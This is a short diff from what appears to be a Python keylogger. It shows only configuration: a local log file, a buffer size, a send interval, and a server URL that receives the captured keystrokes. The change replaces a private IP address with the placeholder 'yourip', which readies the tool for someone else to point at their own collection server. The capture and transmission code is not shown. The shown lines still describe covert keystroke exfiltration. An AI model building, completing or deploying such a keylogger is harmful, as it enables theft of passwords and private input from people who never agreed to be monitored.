@@ -6,7 +6,7 @@ import time
 
 # Configuration
 log_file_path = "keystroke_log.txt"
-server_url = "http://10.7.241.179:8080/receive_keystrokes"
+server_url = "http://yourip:8080/receive_keystrokes"
 buffer_size = 10  # Send buffer when it reaches this size
 send_interval = 5  # Seconds, send buffer at this interval if not full
 
